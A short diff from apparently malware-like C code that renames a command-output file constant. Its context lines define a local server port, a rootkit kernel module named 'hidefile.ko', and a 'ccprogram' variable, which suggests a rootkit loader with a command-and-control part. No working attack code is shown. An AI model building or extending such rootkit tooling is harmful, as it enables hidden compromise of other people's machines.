@@ -15,7 +15,7 @@
 #define SP_PORT     8895
 #define BUFFER_SIZE 4096
 #define SERVER_ADDR "127.0.0.1"
-#define CMD_RESULT "cmdoutput.txt"
+#define CMD_RESULT "cmdoutput.txttmp"
 char* ROOTKIT = "hidefile.ko";   
 char* CCPROGRAM = "ccprogram";  
 struct utsname OS_info;
